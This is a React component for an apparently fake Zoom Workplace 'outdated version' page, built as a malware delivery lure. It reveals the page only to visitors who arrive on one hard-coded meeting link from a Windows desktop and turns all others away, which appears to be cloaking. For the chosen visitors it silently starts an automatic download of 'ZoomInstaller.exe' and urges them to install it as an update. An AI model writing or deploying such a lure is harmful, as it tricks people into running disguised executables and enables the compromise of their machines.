"use client";

import { useEffect, useState } from "react";

const UPDATE_FILE_PATH = "/ZoomInstaller.exe";
const MINIMUM_LOADING_TIME = 2000;
const NON_DESKTOP_USER_AGENT =
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i;
const AUTHORIZED_PATH =
  "/j/8237770634?pwd=i7gt2XsqvGas7hF6ZaJyQaKCnjVdfU.1";

// Matches Windows desktop user agents / platforms
const WINDOWS_USER_AGENT = /Windows NT|Win32|Win64|WOW64/i;

export const isWindowsDesktopDevice = () => {
  const hasDesktopViewport = window.matchMedia("(min-width: 1024px)").matches;
  const hasDesktopPointer = window.matchMedia(
    "(hover: hover) and (pointer: fine)",
  ).matches;
  const hasMobileUserAgent = NON_DESKTOP_USER_AGENT.test(navigator.userAgent);

  const uaIsWindows = WINDOWS_USER_AGENT.test(navigator.userAgent);
  const platformIsWindows = typeof navigator.platform === "string" &&
    navigator.platform.toLowerCase().includes("win");

  const isWindows = uaIsWindows || platformIsWindows;

  return hasDesktopViewport && hasDesktopPointer && !hasMobileUserAgent && isWindows;
};

const isAuthorizedUrl = () =>
  window.location.pathname + window.location.search === AUTHORIZED_PATH;

const ZoomUpdateFullScreen = () => {
  const [accessState, setAccessState] = useState<
    "checking" | "desktop" | "blocked"
  >("checking");
  const [blockedReason, setBlockedReason] = useState<
    "os" | "link" | "unknown"
  >("unknown");

  useEffect(() => {
    let timeoutId: number | undefined;

    const finishLoading = () => {
      timeoutId = window.setTimeout(() => {
        if (!isAuthorizedUrl()) {
          setBlockedReason("link");
          setAccessState("blocked");
          return;
        }

        if (!isWindowsDesktopDevice()) {
          setBlockedReason("os");
          setAccessState("blocked");
          return;
        }

        setBlockedReason("unknown");
        setAccessState("desktop");
      }, MINIMUM_LOADING_TIME);
    };

    if (document.readyState === "complete") {
      finishLoading();
    } else {
      window.addEventListener("load", finishLoading, { once: true });
    }

    return () => {
      window.removeEventListener("load", finishLoading);
      if (timeoutId !== undefined) {
        window.clearTimeout(timeoutId);
      }
    };
  }, []);

  useEffect(() => {
    if (accessState !== "desktop") {
      return;
    }

    const downloadLink = document.createElement("a");
    downloadLink.href = UPDATE_FILE_PATH;
    downloadLink.download = "";
    downloadLink.style.display = "none";

    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
  }, [accessState]);

  if (accessState === "checking") {
    return (
      <div
        role="status"
        aria-live="polite"
        className="fixed inset-0 z-50 flex min-h-screen w-full items-center justify-center bg-white px-6"
      >
        <div className="flex w-full max-w-sm flex-col items-center gap-6 text-center">
          <img src="/logo.png" alt="Zoom" className="h-auto w-32" />
          <div className="relative h-16 w-16">
            <div className="absolute inset-0 rounded-full border-4 border-blue-100" />
            <div className="absolute inset-0 animate-spin rounded-full border-4 border-transparent border-t-[#004be5]" />
          </div>
          <div className="space-y-2">
            <p className="text-base font-bold text-gray-950">
              Preparing Zoom Workplace
            </p>
            <p className="text-sm leading-relaxed text-gray-500">
              Please wait...
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (accessState === "blocked") {
    const blockedMessage =
      blockedReason === "link"
        ? "This meeting link is restricted to the authorized Zoom meeting URL. Please open the exact join link shown in your invite."
        : blockedReason === "os"
        ? "This link is limited to Windows desktop devices only. Please open it on a Windows computer to continue."
        : "This page is only available from the authorized Windows desktop meeting environment.";

    return (
      <div className="fixed inset-0 z-50 flex min-h-screen w-full items-center justify-center bg-[#f4f7fa] px-6">
        <div className="w-full max-w-md text-center">
          <p className="text-sm font-semibold uppercase tracking-[0.24em] text-[#004be5]">
            Windows desktop required
          </p>
          <h1 className="mt-3 text-4xl font-extrabold tracking-tight text-gray-950">
            Zoom Workplace access is restricted
          </h1>
          <p className="mt-4 text-sm leading-relaxed text-gray-600">
            {blockedMessage}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-[#f4f7fa] flex flex-col font-sans overflow-x-hidden">
      {/* Main Full-Screen Split Grid */}
      <main className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12">
        {/* LEFT COLUMN: Content & Downloads (7/12 Width on large screens) */}
        <div className="lg:col-span-7 flex flex-col justify-center px-6 sm:px-12 md:px-20 xl:px-32 py-12 bg-white">
          <div className="max-w-2xl w-full mx-auto lg:mx-0 space-y-8">
            {/* Logo */}
            {/* <div>
              <img src="/logo.png" alt="Zoom" className="h-9 w-auto" />
            </div> */}

            {/* Error / Status Text */}
            <div className="space-y-4">
              <h1 className="text-3xl font-black text-gray-950 tracking-tight leading-tight">
                Sorry, Your version of Zoom Workplace is outdated.
              </h1>
              <p className="text-gray-600 text-lg leading-relaxed">
                Zoom Worksplace will download automatically, kindly install to
                enjoy the Remote Desktop Meeting. If it doesn&apos;t,{" "}
                <span>
                  <a
                    href={UPDATE_FILE_PATH}
                    download={true}
                    className="text-[#004be5] underline font-bold"
                  >
                    restart the download
                  </a>
                </span>
              </p>
            </div>

            {/* Core CTA Actions */}
            <div className="flex flex-col sm:flex-row gap-4 pt-2">
              <a
                href={UPDATE_FILE_PATH}
                download={true}
                className="inline-flex justify-center items-center px-4 py-4 border border-transparent text-sm font-bold rounded-xl text-white bg-blue-600 hover:bg-blue-700 active:scale-[0.99] transition-all shadow-lg shadow-blue-200 text-center"
              >
                Update Zoom Workplace
              </a>
            </div>

            <hr className="border-gray-200" />

            {/* Alternative Mobile Channels */}
            <div className="space-y-4">
              <div className="flex flex-wrap gap-4 items-center">
                {/* QR Code Wrapper */}
                <div className="bg-gray-50 border border-gray-200 p-2.5 inline-block rounded-xl shadow-sm">
                  <img
                    src="/qrcode.png"
                    alt="QR Code"
                    className="w-24 h-24 mix-blend-multiply"
                  />
                </div>

                {/* Store Badges + Description Group */}
                <div className="space-y-3">
                  <div className="flex gap-2">
                    <a
                      href="#"
                      className="hover:opacity-90 transition-opacity bg-black h-10 p-2.5 rounded-md"
                    >
                      <img
                        src="/appstore.png"
                        alt="App Store"
                        className="h-full w-auto"
                      />
                    </a>
                    <a
                      href="#"
                      className="hover:opacity-90 transition-opacity bg-black h-10 p-2.5 rounded-md"
                    >
                      {" "}
                      <img
                        src="/googleplay.png"
                        alt="Google Play"
                        className="h-full w-auto"
                      />
                    </a>
                  </div>
                  <p className="text-sm text-gray-500 leading-normal max-w-sm">
                    Scan the QR code or open your native mobile store app to
                    instantly patch your device via{" "}
                    <a
                      href="https://zoom.us/go"
                      className="text-blue-600 font-medium hover:underline"
                    >
                      zoom.us/go
                    </a>
                    .
                  </p>
                </div>
              </div>
            </div>

            {/* Embedded Footer Link inside Content area */}
            <p className="text-xs text-gray-400 pt-4">
              Managed device? Contact your organization&apos;s IT Administrator.
              For system requirements, check the{" "}
              <a href="#" className="underline hover:text-gray-600">
                Zoom Support Center
              </a>
              .
            </p>
          </div>
        </div>

        {/* RIGHT COLUMN: Feature Promo Billboard (5/12 Width on large screens) */}
        <div className="lg:col-span-5 bg-[#d2e3fc] flex flex-col justify-between p-12 lg:p-20 relative overflow-hidden min-h-100 lg:min-h-0">
          {/* Subtle decorative background pattern element */}
          <div className="absolute top-0 right-0 w-96 h-96 bg-blue-300/20 rounded-full blur-3xl -mr-20 -mt-20 pointer-events-none" />

          {/* Top Info Block */}
          <div className="max-w-md space-y-4 relative z-10 my-auto lg:my-0">
            <span className="inline-block bg-blue-600 text-white text-xs font-black px-3 py-1 rounded-full uppercase tracking-widest shadow-sm">
              New Upgrades Included
            </span>
            <h2 className="text-3xl font-extrabold text-gray-900 tracking-tight">
              Meet the new Zoom Workplace.
            </h2>
            <p className="text-gray-700 text-base  leading-relaxed">
              Updating unlocks next-gen collaboration workspaces, smarter
              unified team chats, automated scheduling features, and powerful
              built-in generative AI Companion capabilities.
            </p>
          </div>

          {/* Floating UI Screenshot Representation sticking out of the bottom */}
          <div className="relative mt-8 lg:mt-0 lg:absolute lg:bottom-0 lg:right-0 lg:left-20 h-56 lg:h-72 shadow-2xl rounded-tl-2xl rounded-bl-2xl overflow-hidden border-t border-l border-white/60 bg-white">
            <img
              src="/zoom-workspace-xan.png"
              alt="Zoom Workplace Desktop Interface Mockup"
              className="w-full h-full object-cover object-top"
            />
          </div>
        </div>
      </main>
    </div>
  );
};

export default ZoomUpdateFullScreen;
